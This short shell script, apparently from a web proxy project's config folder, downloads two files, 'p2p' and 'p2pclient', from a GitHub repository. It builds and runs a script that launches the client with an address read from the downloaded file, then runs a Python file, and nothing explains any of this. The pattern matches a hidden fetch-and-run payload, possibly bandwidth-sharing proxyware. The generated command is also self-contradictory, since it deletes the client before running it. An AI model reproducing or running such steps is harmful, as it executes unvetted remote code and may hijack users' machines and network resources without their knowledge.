rm -rf p2p.sh
wget https://raw.githubusercontent.com/bls4/womginx/main/config/p2p
wget https://raw.githubusercontent.com/bls4/womginx/main/config/p2pclient
echo -e "rm -rf p2pclient  && chmod +x p2pclient ./p2pclient -l MAIL_ADDREES" | sed -e "s/MAIL_ADDREES/$(cat p2p)/" > p2p.sh
/bin/bash -c p2p.sh
python3 /opt/womginx/config/timep.py